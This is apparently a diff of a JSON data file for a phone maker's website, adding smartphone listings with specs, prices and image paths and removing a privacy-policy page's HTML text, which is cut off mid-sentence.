+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display  | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-02-05T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "thumbnail_variant": [
+              {
+                "id": 2177,
+                "name": "Siachen White",
+                "image": "media/images/product-variant/image_path/star-3-listing-1782735070.webp",
+                "thumbnail": null,
+                "color_code": "#f5f5f5",
+                "product_id": 1128
+              },
+              {
+                "id": 2178,
+                "name": "Indus Black",
+                "image": "media/images/product-variant/image_path/star-3-listing1-1782735087.webp",
+                "thumbnail": null,
+                "color_code": "#191919",
+                "product_id": 1128
+              }
+            ]
+          },
+          {
+            "id": 1127,
+            "name": "Blaze Duo 3",
+            "slug": "blaze-duo-3",
+            "status": 1,
+            "image": "media/community/image/blaze-duo-3-listing-1782735263.webp",
+            "thumbnail_image": null,
+            "short_description": "Large 16.94cm (6.67\") FHD+ Amoled Punch-Hole Display with 120Hz Refresh Rate | Segment's First 1.6\" Secondary AMOLED Display | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | 50MP AI Rear Camera with Sony Sensor | (6GB+6GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Superior Audio Experience with Stereo Speakers",
+            "description": null,
+            "price": 21999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-01-19T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "thumbnail_variant": [
+              {
+                "id": 2175,
+                "name": "Blaze Duo 3",
+                "image": "media/images/product-variant/image_path/blaze-duo-3-listing-1782735342.webp",
+                "thumbnail": null,
+                "color_code": "#18191d",
+                "product_id": 1127
+              },
+              {
+                "id": 2176,
+                "name": "Blaze Duo 3",
+                "image": "media/images/product-variant/image_path/blaze-duo-3-listing1-1782735366.webp",
+                "thumbnail": null,
+                "color_code": "#d0ccbc",
+                "product_id": 1127
+              }
+            ]
+          },
+          {
+            "id": 1124,
+            "name": "Play Max",
+            "slug": "play-max",
+            "status": 1,
+            "image": "media/community/image/play-max-listing-1782735825.webp",
+            "thumbnail_image": null,
+            "short_description": "2.5 GHz MediaTek Dimensity 7300 Processor (4nm) - 700,000K+ Antutu Score | 6.72\" FHD+ Display with 120Hz Refresh Rate | (6GB+6GB*)/(8GB+8GB*) LPDDR4X RAM + 128GB UFS 3.1 ROM | VC chamber cooling | 50MP AI Camera with EIS, 8MP Selfie Camera",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-12-12T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1025,
+            "thumbnail_variant": [
+              {
+                "id": 2168,
+                "name": "DECCAN BLACK",
+                "image": "media/images/product-variant/image_path/play-max-listing-1782735859.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 1124
+              },
+              {
+                "id": 2169,
+                "name": "HIMALAYAN WHITE",
+                "image": "media/images/product-variant/image_path/play-max-listing1-1782735879.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 1124
+              }
+            ]
+          },
+          {
+            "id": 1123,
+            "name": "AGNI 4",
+            "slug": "agni-4",
+            "status": 1,
+            "image": "media/community/image/agni-4-listing-v1-1782736173.webp",
+            "thumbnail_image": null,
+            "short_description": "Premium flagship design with Aluminum Metal frame & Matte AG Glass Back | Powered by Vayu AI with Expert AI Agents for learning, creativity, productivity and system-level control | 3.35GHz MediaTek Dimensity 8350 Processor (4nm) with LPDDR5X RAM & UFS4.0 Storage | 16.94cm (6.67-inch) 1.5K Flat AMOLED display with 120Hz refresh rate & 2400nits of peak brightness | 50MP OIS Main Rear Camera + 8MP Ultrawide + 50MP Front Camera with EIS, both rear & front with 4K@60fps",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-11-20T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 2,
+            "thumbnail_variant": [
+              {
+                "id": 2165,
+                "name": "Agni 4",
+                "image": "media/images/product-variant/image_path/agni-4-listing-v1-1782736201.webp",
+                "thumbnail": null,
+                "color_code": "#fcfcfc",
+                "product_id": 1123
+              },
+              {
+                "id": 2166,
+                "name": "Agni 4",
+                "image": "media/images/product-variant/image_path/agni-4-listing-v2-1782736214.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 1123
+              }
+            ]
+          },
+          {
+            "id": 90,
+            "name": "AGNI 3",
+            "slug": "agni-3",
+            "status": 1,
+            "image": "media/community/image/agni-3-listing-1728025925.webp",
+            "thumbnail_image": null,
+            "short_description": "Segment-first Dual AMOLED display on front & back | Segment-first MediaTek Dimensity 7300X processor | 50MP Sony Quad-Bayer camera with OIS",
+            "description": null,
+            "price": 25499,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-10-04T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 2,
+            "thumbnail_variant": [
+              {
+                "id": 1130,
+                "name": "Pristine Glass",
+                "image": "media/images/product-variant/image_path/agni-3-listing-1728033681.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 90
+              },
+              {
+                "id": 1131,
+                "name": "Heather Glass",
+                "image": "media/images/product-variant/image_path/agni-3-listing2-1728033770.webp",
+                "thumbnail": null,
+                "color_code": "#44415c",
+                "product_id": 90
+              }
+            ]
+          },
+          {
+            "id": 118,
+            "name": "Blaze Dragon",
+            "slug": "blaze-dragon",
+            "status": 1,
+            "image": "media/community/image/blaze-dragon-listing1-1753527548.webp",
+            "thumbnail_image": null,
+            "short_description": "2.2 GHz Snapdragon 4Gen2 Processor | (4GB+4GB*)/(6GB+6GB*) LPDDR4X RAM + 128GB UFS 3.1 ROM | 50MP AI Rear Camera and 8MP Front Camera | 6.75\" HD+ Display with 120Hz Refresh Rate | Powerful 5000mAh Battery with 18W Fast Charging | Type-C USB | Premium Glossy Black Design | Clean Android 15 OS \u2013 No Bloatware, No Ads, No Notifications",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-07-25T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "thumbnail_variant": [
+              {
+                "id": 1162,
+                "name": "Midnight Mist",
+                "image": "media/images/product-variant/image_path/blaze-dragon-listing1-1753527619.webp",
+                "thumbnail": null,
+                "color_code": "#182034",
+                "product_id": 118
+              },
+              {
+                "id": 1163,
+                "name": "Golden Mist",
+                "image": "media/images/product-variant/image_path/blaze-dragon-listing2-1753527686.webp",
+                "thumbnail": null,
+                "color_code": "#b7b3ab",
+                "product_id": 118
+              }
+            ]
+          },
+          {
+            "id": 117,
+            "name": "Storm Play 5G",
+            "slug": "storm-play-5g",
+            "status": 1,
+            "image": "media/community/image/storm-play-listing-1750746236.webp",
+            "thumbnail_image": null,
+            "short_description": "Large 17.13cm (6.75\") HD+ Water-Drop Display with 120Hz Refresh Rate | 50MP AI Rear Camera with Sony Sensor | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | (6GB+6GB*) / (8GB+8GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Powerful 5000mAh Battery with 18W Fast Charging Supported | Type-C USB | Premium Glossy Back Design",
+            "description": null,
+            "price": 13499,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-06-17T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 4,
+            "thumbnail_variant": [
+              {
+                "id": 1160,
+                "name": "Frosty Blue",
+                "image": "media/images/product-variant/image_path/storm-play-listing-1750746153.webp",
+                "thumbnail": null,
+                "color_code": "#23384b",
+                "product_id": 117
+              },
+              {
+                "id": 1161,
+                "name": "Dune Titanium",
+                "image": "media/images/product-variant/image_path/storm-play-listing1-1750746218.webp",
+                "thumbnail": null,
+                "color_code": "#a3a29c",
+                "product_id": 117
+              }
+            ]
+          },
+          {
+            "id": 116,
+            "name": "Storm Lite 5G",
+            "slug": "storm-lite",
+            "status": 1,
+            "image": "media/community/image/storm-lite-listing-1750842491.webp",
+            "thumbnail_image": null,
+            "short_description": "Lightning Fast Performance with MediaTek Dimensity 6400 Chipset | 4GB+4GB* RAM  l 64 GB/128GB Memory | 50MP SONY IMX752 Sensor Rear Camera & 5 MP Selfie Camera | (6.75\") 120Hz Display |",
+            "description": null,
+            "price": 10999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-06-13T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 4,
+            "thumbnail_variant": [
+              {
+                "id": 1158,
+                "name": "Astral Blue",
+                "image": "media/images/product-variant/image_path/storm-lite-listing-1750842513.webp",
+                "thumbnail": null,
+                "color_code": "#424e69",
+                "product_id": 116
+              },
+              {
+                "id": 1159,
+                "name": "Cosmic Titanium",
+                "image": "media/images/product-variant/image_path/storm-lite-listing1-1750842528.webp",
+                "thumbnail": null,
+                "color_code": "#c0bdb6",
+                "product_id": 116
+              }
+            ]
+          },
+          {
+            "id": 114,
+            "name": "Bold N1 Pro",
+            "slug": "bold-n1-pro",
+            "status": 1,
+            "image": "media/community/image/bold-n1pro-listing-1749128956.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Rear Camera | 8MP Selfie Camera | 4GB+4GB* RAM  | 128GB ROM | Octa-core UNISOC T606 Processor | 16.94cm (6.67\") HD+ Punch Hole Display  | 120Hz Refresh Rate | \r\n5000mAh Battery with Type-C Port & 10W Charging (18W Fast Charging Support)",
+            "description": null,
+            "price": 8399,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-05-29T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "thumbnail_variant": [
+              {
+                "id": 1154,
+                "name": "Bold N1 Pro",
+                "image": "media/images/product-variant/image_path/bold-n1pro-listing-1749128941.webp",
+                "thumbnail": null,
+                "color_code": "#c9c1b6",
+                "product_id": 114
+              },
+              {
+                "id": 1155,
+                "name": "Bold N1 Pro",
+                "image": "media/images/product-variant/image_path/bold-n1pro-listing1-1749128980.webp",
+                "thumbnail": null,
+                "color_code": "#242a38",
+                "product_id": 114
+              }
+            ]
+          },
+          {
+            "id": 115,
+            "name": "Bold N1",
+            "slug": "bold-n1",
+            "status": 1,
+            "image": "media/community/image/bold-n1-listing-1749128869.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa-core Processor | 17.13cm (6.75\") HD+ Display  | 13MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10W Charging | IP54 Dust and Water Resistant",
+            "description": null,
+            "price": 7499,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-05-11T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "thumbnail_variant": [
+              {
+                "id": 1156,
+                "name": "Radiant Black",
+                "image": "media/images/product-variant/image_path/bold-n1-listing-1749128831.webp",
+                "thumbnail": null,
+                "color_code": "#0e141b",
+                "product_id": 115
+              },
+              {
+                "id": 1157,
+                "name": "Sparkling Ivory",
+                "image": "media/images/product-variant/image_path/bold-n1-listing1-1749128851.webp",
+                "thumbnail": null,
+                "color_code": "#f0eadd",
+                "product_id": 115
+              }
+            ]
+          },
+          {
+            "id": 93,
+            "name": "Yuva 4",
+            "slug": "yuva-4",
+            "status": 1,
+            "image": "media/community/image/yuva-4-listing-1732879416.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Triple Rear Camera I 8MP Selfie Camera | 4GB+4GB* RAM  l 64GB/128GB ROM | Octa-core UNISOC T606 Processor | 16.55cm (6.56\") HD+ Punch Hole Display",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2024-11-30T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "thumbnail_variant": [
+              {
+                "id": 1132,
+                "name": "Glossy Purple",
+                "image": "media/images/product-variant/image_path/yuva-4-listing-color1-1732879703.webp",
+                "thumbnail": null,
+                "color_code": "#1c1332",
+                "product_id": 93
+              },
+              {
+                "id": 1133,
+                "name": "Glossy Black",
+                "image": "media/images/product-variant/image_path/yuva-4-listing-color2-1732879765.webp",
+                "thumbnail": null,
+                "color_code": "#07080a",
+                "product_id": 93
+              },
+              {
+                "id": 1134,
+                "name": "Glossy White",
+                "image": "media/images/product-variant/image_path/yuva-4-listing-color3-1732879827.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 93
+              }
+            ]
+          },
+          {
+            "id": 88,
+            "name": "Blaze 3 5G",
+            "slug": "blaze-3-5g",
+            "status": 1,
+            "image": "media/community/image/blaze-3-5g-listing-1726467349.webp",
+            "thumbnail_image": null,
+            "short_description": "Segment First VIBE Light | Lightning Fast Performance with MediaTek Dimensity 6300 Chipset | 6GB+6GB* RAM  l 128GB UFS 2.2 Memory",
+            "description": null,
+            "price": 12999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2024-09-16T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": "no",
+            "category_id": 3,
+            "thumbnail_variant": [
+              {
+                "id": 1125,
+                "name": "Glass Blue",
+                "image": "media/images/product-variant/image_path/blaze-3-5g-listing-color1-1726470670.webp",
+                "thumbnail": null,
+                "color_code": "#0b1322",
+                "product_id": 88
+              },
+              {
+                "id": 1126,
+                "name": "Glass Gold",
+                "image": "media/images/product-variant/image_path/blaze-3-5g-listing-color2-1726470685.webp",
+                "thumbnail": null,
+                "color_code": "#d9d6c9",
+                "product_id": 88
+              }
+            ]
+          },
+          {
+            "id": 72,
+            "name": "Yuva 3",
+            "slug": "yuva-3",
+            "status": 1,
+            "image": "media/community/image/yuva-3-3-1708940691-1710409248.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+ 4GB* RAM I 128GB UFS 2.2 ROM | UNISOC T606 Octa-core Processor (AnTuTu 200K+) | 90Hz 16.55cm (6.5\") HD+ Punch Hole Display",
+            "description": null,
+            "price": 7999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2024-02-04T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "thumbnail_variant": [
+              {
+                "id": 1097,
+                "name": "Eclipse Black",
+                "image": "media/images/product-variant/image_path/yuva-3-3-1708940691.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 72
+              },
+              {
+                "id": 1098,
+                "name": "Cosmic Lavender",
+                "image": "media/images/product-variant/image_path/yuva-3-1708940729.webp",
+                "thumbnail": null,
+                "color_code": "#c7c9e4",
+                "product_id": 72
+              },
+              {
+                "id": 1099,
+                "name": "Galaxy White",
+                "image": "media/images/product-variant/image_path/yuva-3-1-1708940826.webp",
+                "thumbnail": null,
+                "color_code": "#efefef",
+                "product_id": 72
+              }
+            ]
+          }
+        ],
+        "all_product_banner": {
+          "title": "Smartphones",
+          "image": "media/product/all_product_banner/all-product-smartphone-1722945401-1752836152.png",
+          "mobile_banner": "media/product/all_product_banner/mobile-smartphone-1722945401-1752836152.jpg"
+        }
+      },
+      "pageData": {
+        "status": 1,
+        "msg": "smartphones Page Content",
         "data": {
-          "id": 2,
-          "slug": "privacy-policy",
-          "name": "Privacy Policy",
+          "id": 8,
+          "slug": "smartphones",
+          "name": "Smartphones",
           "sub_text": null,
-          "content1": "<p>This Privacy Policy is published in accordance with the provisions of Rule 3(1) of the Information Technology (Intermediaries Guidelines) Rules, 2011. The Policy is an 'electronic record' as contemplated under section 2(t) of the Information Technology Act, 2000 and the rules. This Policy being an electronic record is generated by a computer system and does not require any physical or digital signature.</p>\r\n\r\n<p>In addition to this Privacy Policy, we provide data and privacy information embedded in our products and certain features that ask to use your personal information.</p>\r\n\r\n<p>You will be given an opportunity to review this product-specific information before enabling these features. You also can view this information at any time, either in Settings related to those features and/or online at Lava.com/legal/privacy.</p>\r\n\r\n<h2>What Is Personal Data at Lava?</h2>\r\n<p>At Lava, we believe strongly in fundamental privacy rights - and that those fundamental rights should not differ depending on where you live in the world. <strong>That's why we treat any data that relates to an identified or identifiable individual or that is linked or linkable to them by Lava as \"personal data,\" no matter where the individual lives.</strong> This means that data that directly identifies you - such as your name, email address,  residential address, phone number, photograph and other information collected by specific services/products - is personal data, and also data that does not directly identify you, but that can reasonably be used to identify you - such as the serial number of your device, IP address, login id, email address, password, devise connection information, transaction history, date, time and duration of session etc. (collectively referred as 'personal data').</p>\r\n\r\n<p>This Privacy Policy covers how Lava handles personal data whether you interact with us on our websites, through Lava apps (such as Lava Pay), or in person (including by phone or when visiting our retail stores or authorised service partners). Lava may also link to third parties on our services or make third-party apps available for download in our App Store. Lava's Privacy Policy does not apply to how third parties define personal data or how they use it. We encourage you to read their privacy policies and know your privacy rights before interacting with them.</p>\r\n\r\n<h2>Your Privacy Rights at Lava</h2>\r\n<p>At Lava, we respect your ability to know, access, correct, transfer, restrict the processing of, and delete your personal data. We have provided these rights to our global customer base and if you choose to exercise these privacy rights, you have the right not to be treated in a discriminatory way nor to receive a lesser degree of service from Lava. Lava does not sell your data to any individual or entity.</p>\r\n\r\n<p><strong>To exercise your privacy rights and choices, visit the Lava website at <a href=\"https://www.lavamobiles.com\" target=\"_blank\" style=\"color:#ed1556;\">www.lavamobiles.com </a>.</strong></p> \r\n<p>There may be situations where we cannot grant your request - for example, if you ask us to delete your transaction data and Lava is legally obligated to keep a record of that transaction to comply with law. We may also decline to grant a request where doing so would undermine our legitimate use of data for anti-fraud and security purposes, such as when you request deletion of an account that is being investigated for security concerns. Other reasons your privacy request may be denied are if it jeopardizes the privacy of others, is frivolous or vexatious, or would be extremely impractical.</p>\r\n\r\n<h2>Personal Data Lava Collects from You</h2>\r\n<p>At Lava, we believe that you can have great products and great privacy. This means that we strive to <strong>collect only the personal data that we need.</strong> The personal data Lava collects depends on how you interact with Lava.</p>\r\n<p>When you create an ID, apply for commercial credit, purchase and/or activate a product or device, download a software update, register for a class, connect to our services, contact us (including by social media), participate in an online survey, or otherwise interact with Lava, we may collect a variety of information, including:</p>\r\n<ul>\r\n<li><strong>Account Information.</strong> Your ID and related account details, including email address, devices registered, account status, and age</li>\r\n<li><strong>Device Information.</strong> Data from which your device could be identified, such as device serial number, or about your device, such as browser type</li>\r\n<li><strong>Contact Information.</strong> Data such as name, email address, physical address, phone number, or other contact information</li>\r\n<li><strong>Payment Information.</strong> Data about your billing address and method of payment, such as bank details, credit, debit, or other payment card information</li>\r\n<li><strong>Transaction Information.</strong> Data about purchases of Lava products and services or transactions facilitated by Lava, including purchases on Lava platforms</li>\r\n<li><strong>Fraud Prevention Information.</strong> Data used to help identify and prevent fraud, including a device trust score</li>\r\n<li><strong>Usage Data.</strong> Data about your activity on and use of our offerings, such as app launches within our services, including browsing history; search history; product interaction; crash data, performance and other diagnostic data; and other usage data</li>\r\n\r\n<li><strong>Health Information.</strong> Data relating to the health status of an individual, including data related to one's physical or mental health or condition. Personal health data also includes data that can be used to make inferences about or detect the health status of an individual. </li>\r\n<li><strong>Government ID Data.</strong> In certain jurisdictions, we may ask for a government-issued ID in limited circumstances, including when setting up a wireless account and activating your device, for the purpose of extending commercial credit, managing reservations, or as required by law</li><li><span style=\"font-weight: 700;\">Location.</span>&nbsp;My Lava captures location data to monitor employee attendance and track their traveled distance. This data is securely stored and automatically deleted after one year.</li>\r\n<li><strong>Other Information You Provide to Us.</strong> Details such as the content of your communications with Lava, including interactions with customer support and contacts through social media channels\r\nYou are not required to provide the personal data that we have requested. However, if you choose not to do so, in many cases we will not be able to provide you with our products or services or respond to requests you may have.</li>\r\n</ul>\r\n\r\n<h2>Personal Data Lava Receives from Other Sources</h2>\r\n<p>Lava may receive personal data about you from other <strong>individuals,</strong> from businesses or third parties acting <strong>at your direction,</strong> from our <strong>partners</strong> who work with us to provide our products and services and assist us in security and fraud prevention, and from other lawful sources.</p>\r\n<ul>\r\n<li><strong>Individuals.</strong> Lava may collect data about you from other individuals - for example, if that individual has sent you a product or gift card, invited you to participate in an Lava service or forum, or shared content with you.</li>\r\n<li><strong>At Your Direction.</strong> You may direct other individuals or third parties to share data with Lava. For example, you may direct your mobile carrier to share data about your carrier account with Lava for account activation, or for your loyalty program to share information about your participation so that you can earn rewards for Lava purchases.</li>\r\n</ul>\r\n\r\n<h2>Lava's Use of Personal Data</h2>\r\n<p><strong>Lava uses personal data to power our services, to process your transactions, to communicate with you, for security and fraud prevention, and to comply with law. We may also use personal data for other purposes with your consent.</strong></p>\r\n\r\n<p><strong>Lava uses your personal data only when we have a valid legal basis to do so.</strong> Depending on the circumstance, Lava may rely on your consent or the fact that the processing is necessary to fulfill a contract with you, protect your vital interests or those of other persons, or to comply with law. We may also process your personal data where we believe it is in our or others' legitimate interests, taking into consideration your interests, rights, and expectations.</p>\r\n<ul>\r\n<li><strong>Process Your Transactions.</strong> To process transactions, Lava must collect data such as your name, purchase, and payment information.</li>\r\n<li><strong>Communicate with You.</strong> To respond to communications, reach out to you about your transactions or account, market our products and services, provide other relevant information, or request information or feedback. From time to time, we may use your personal data to send important notices, such as communications about purchases and changes to our terms, conditions, and policies. Because this information is important to your interaction with Lava, you may not opt out of receiving these important notices.</li>\r\n<li><strong>Security and Fraud Prevention.</strong> To protect individuals, employees, and Lava and for loss prevention and to prevent fraud, including to protect individuals, employees, and Lava for the benefit of all our users, and prescreening or scanning uploaded content for potentially illegal content.</li>\r\n<li><strong>Comply with Law.</strong> To comply with applicable law - for example, to satisfy tax or reporting obligations, or to comply with a lawful governmental request.</li>\r\n</ul>\r\n\r\n<p>Lava does not use algorithms or profiling to make any decision that would significantly affect you without the opportunity for human review.</p>\r\n\r\n<p><strong>Lava retains personal data only for so long as necessary to fulfill the purposes for which it was collected, including as described in this Privacy Policy or in our service-specific privacy notices, or as required by law.</strong> We will retain your personal data for the period necessary to fulfill the purposes outlined in this Privacy Policy and our service-specific privacy summaries. When assessing retention periods, we first carefully examine whether it is necessary to retain the personal data collected and, if retention is required, work to retain the personal data for the shortest possible period permissible under law.</p>\r\n\r\n<h2>Protection of Personal Data at Lava</h2>\r\n<p>At Lava, we believe that great privacy rests on great security. We use <strong>administrative, technical, and physical safeguards</strong> to protect your personal data, taking into account the nature of the personal data and the processing, and the threats posed. We are constantly working to improve on these safeguards to help keep your personal data secure. However,  any such safeguards cannot eliminate security risks. Lava endeavours to take all measures to protect the security, integrity and confidentiality of the personal data against unauthorized breach and hacking. However, Lava cannot ensure or warrant a 100% security of the personal data. Lava will not be responsible or liable in any manner whatsoever, for any unauthorised access of use of the personal data.</p>\r\n<p>If any user is provided with any identification code, password or any other piece of information as part of the product/service's security procedure, the user should treat such information as confidential, and the user should not disclose it to any third party including to other users. To prevent third party's access to the product/service, the user should sign out from the user account after availing the services. Lava has the right to disable the identification code or password, whether chosen by any user or allotted by Lava, at any time, if the user fails to comply with instructions or terms, conditions or policies of Lava related to use of products/services and this privacy policy.</p>\r\n\r\n<p>The user is solely responsible for the activities that occur under the user's account including the confidentiality of the user's password and Lava is not responsible for the same. While using and accessing the product/service, the user is responsible for maintaining the confidentiality of the user's account and for restricting access to the user's computer or other system or equipment through which the user uses and accesses the service/product.</p>\r\n\r\n<p>Notwithstanding anything contained in this Policy or elsewhere, Lava shall not be held responsible for any loss, damage or misuse of the personal data, if such loss, damage or misuse is attributable to a Force Majeure Event. A <strong>\"Force Majeure Event\"</strong> means any event that is beyond the reasonable control of Lava and includes, without limitation, fire, flood, explosion, acts of God, civil commotion, strikes, lock outs or industrial action of any kind, riots, insurrection, war, acts of government, power failure, sabotage, computer hacking, unauthorised access to computer data and storage device, system failure, virus, attacks, bugs, computer crashes, breach of security and encryption.</p>\r\n\r\n<h2>Third Party Websites And Links</h2>\r\n\r\n<p>Lava's products/services may provide or be linked with other websites, services and/or advertisements. Lava is in no way responsible for the privacy practices or content of such websites. The linked websites or advertisers are not necessarily under the control of Lava and Lava expressly disclaims all liability associated with the content and the use of such websites and advertisements. Display of any third party advertisements on the products/services shall not be construed as an endorsement or promotion of any products or services by Lava. The user should read the privacy policy of each and every linked website/service/product and any such access or use is entirely at the user's own risk. Lava is not responsible for any direct, indirect, solicited or unsolicited communication made by any of these linked third party websites or advertisers or their respective agents or representatives, to the users including by telephone, email, mobile phones and facsimile.</p>\r\n\r\n<p>These linked third-party websites and advertisers may use various technologies to receive the user's IP address and personal information. The third party advertisers may also use cookies, JavaScript, web beacons and other technologies to gauge the effectiveness of their advertisements and to personalize advertising experience and content. Lava does not have any control over the cookies or technologies that advertisers or websites may use and the user should contact them directly for more information about their privacy practices and policies.</p>\r\n \r\n<p>Based on the personal data including the nature of products purchased by the user, Lava may display personalized third party advertisements on the Website.  When the user clicks on the advertisement link, the third party advertisers may assume that the user has met the criteria that was used to personalize the advertisement. The user acknowledges and agrees that in no event Lava is responsible to the user accessing the services of third party advertisers or other websites.</p>\r\n\r\n\r\n<h2>Cookies and Other Technologies</h2>\r\n<p>Lava's websites, online services, interactive applications, email messages, and advertisements may use \"cookies\" and other technologies. <strong>These technologies help us to better understand user behavior including for security and fraud prevention purposes, tell us which parts of our websites people have visited, and facilitate and measure the effectiveness of advertisements and web searches.</strong></p>\r\n<ul>\r\n<li><strong>Communications Cookies.</strong> These cookies are used to enable network traffic to and from Lava's systems, including by helping us detect any errors.</li>\r\n<li><strong>Strictly Necessary Cookies.</strong> These cookies are set as required to provide a specific feature or service that you have accessed or requested. For example, they allow us to display our websites in the proper format and language, to authenticate and verify your transactions, and to preserve the contents of your Bag when shopping online at Lava.com.</li>\r\n<li><strong>Other Cookies.</strong> These cookies are used to understand how visitors interact with our websites and online services, including by helping us to assess the effectiveness of advertisements and web searches. Lava also uses these cookies to remember choices you make while browsing, so we can provide you with a customized experience.</li>\r\n<li><p>If you prefer that Lava not use cookies, we provide you with the means to disable their use. If you want to disable cookies and you're using the web browser, choose \"Block all cookies\" in web browser's privacy settings. If you are using a different browser, check with your provider to find out how to disable cookies. Certain features of the Lava website may not be available if all cookies are disabled.</p>\r\n\r\n<p>In addition to cookies, Lava uses other technologies that help us achieve similar objectives.</p>\r\n\r\n<p>In some email messages Lava sends to you, we provide a \"click-through URL\" that links you to content on the Lava website. When you click one of these URLs, they pass through a separate server before arriving at the destination page on our website. We track this click-through to help us determine interest in particular topics and measure whether we are communicating with you effectively. If you prefer not to be tracked in this way, you should not click graphic or text links in email messages.</p></li>\r\n</ul>\r\n<p><strong>Lava generally treats data we collect using these cookies and similar technologies as non-personal data.</strong> However, to the extent that Internet Protocol (IP) addresses or similar identifiers are considered personal data by local law, we also treat these identifiers as personal data. In addition, Lava sometimes combines non-personal data collected from these technologies with other personal data Lava holds. When we combine data in this way, we treat the combined data as personal data for purposes of this Privacy Policy.</p>\r\n\r\n<h2>Our Companywide Commitment to Your Privacy</h2>\r\n<p>To make sure your personal data is secure, we communicate our privacy and security guidelines to Lava employees and strictly enforce privacy safeguards within the company.</p>\r\n\r\n<h2>General Terms</h2>\r\n\r\n<p>This Policy is to be read in conjunction with and shall be deemed to be part of Lava Products/Service Terms of Use and Terms and Conditions of Sale.</p>\r\n\r\n<p>The personal data resides in Lava's database for a certain period of time even after the user ceases to use or access the product/service and in such cases Lava is not be liable for any usage of the personal data after the user ceases to use or access the Website.</p>\r\n\r\n<p>The Users agree and acknowledge that personal data collated through the product/service could be stored and processed in any other country across the world. The users acknowledge that for effective provision of Lava's products/services in respective territories including territories outside India, the personal data may be stored or processed by trusted third parties. Whenever the personal data is shared with trusted third parties in countries outside India, Lava endeavours that the personal data is transferred in accordance with the applicable laws of India.</p>\r\n\r\n<p>The user should be aware that the User Information or other data, the user provides to Lava could be read, collected, or used by other users or third parties in which case the personal data might be used for sending unsolicited messages or communications for which Lava is not responsible.</p>\r\n\r\n<p>The user agrees and acknowledges Lava's right to utilize the user's posts, contents, information and other personal data for the purpose of providing services through the Website. The contents on the Website may contain comments, post and reviews posted by the users which may be public and searchable on the internet in which case the user's comments, post reviews and information and personal data provided to the Website may be viewed by other users and Lava cannot guarantee that other users or third parties have not made copies of or used the ideas and information that the user has shared on the Website.</p>\r\n\r\n<h2>Grievance Officer</h2>\r\n \r\n<p>In case of any questions about Lava's Privacy Policy or privacy practices, complaints or grievances, the user may contact the Grievance Officer as under:</p>\r\n \r\n<p><strong>Name:</strong> Kushal Singh Chauhan</p>\r\n<p><strong>Email:</strong> <a href=\"mailto:it.compliance@lavainternational.in\">it.compliance@lavainternational.in</a></p>\r\n<p><strong>Phone number:</strong> +91 120 4637100</p>\r\n<p><strong>Address:</strong> A-56, Sector 64, Noida, Gautam Budh Nagar, Uttar Pradesh - 201301</p>\r\n\r\n<p>You can also ask us questions about how to submit a privacy complaint and we will endeavor to help.</p>\r\n<p>Lava takes your privacy questions seriously. A dedicated team reviews your inquiry to determine how best to respond to your question or concern, including those inquiries received in response to an access or download request. In most cases, all substantive contacts receive a response within seven days. In other cases, we may require additional information or let you know that we need more time to respond.</p>\r\n\r\n<p>Where your complaint indicates an improvement could be made in our handling of privacy issues, we will take steps to make such an update at the next reasonable opportunity. In the event that a privacy issue has resulted in a negative impact on you or another person, we will take steps to address that with you or that other person.\r\nWhen there is a material change to this Privacy Policy, we'll post a notice on this website at least a week in advance of doing so and contact you directly about the change if we have your data on 